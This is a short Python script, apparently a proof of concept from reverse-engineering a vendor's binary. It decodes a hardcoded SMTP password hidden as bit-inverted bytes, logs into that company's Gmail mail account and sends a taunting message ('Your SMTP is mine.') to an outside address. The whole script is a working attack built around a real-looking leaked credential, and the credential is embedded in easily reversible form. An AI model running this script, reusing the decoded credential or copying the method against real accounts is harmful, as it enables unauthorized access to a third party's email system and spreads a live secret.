#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText

# python is stupid and uses signed integers, so we need our own bitwise not
def bit_not(n, numbits=8):
    return (1 << numbits) - 1 - n

def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)
    smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    smtp_server.login(sender, password)
    smtp_server.sendmail(sender, recipients, msg.as_string())
    smtp_server.quit()

# as seen in FUN_008ea27c :D
encrypted = [0xB1, 0x9B, 0x8C, 0x8F, 0x8E, 0x9C, 0xCD, 0xCF, 0xCD, 0xCF]
decrypted = ''.join([chr(bit_not(b)) for b in encrypted])

print(decrypted)

subject = "QC test email"
body = "Your SMTP is mine."
sender = "qclogs@neuraldsp.com"
recipients = ["evilsocket@gmail.com"]
password = decrypted

send_email(subject, body, sender, recipients, password)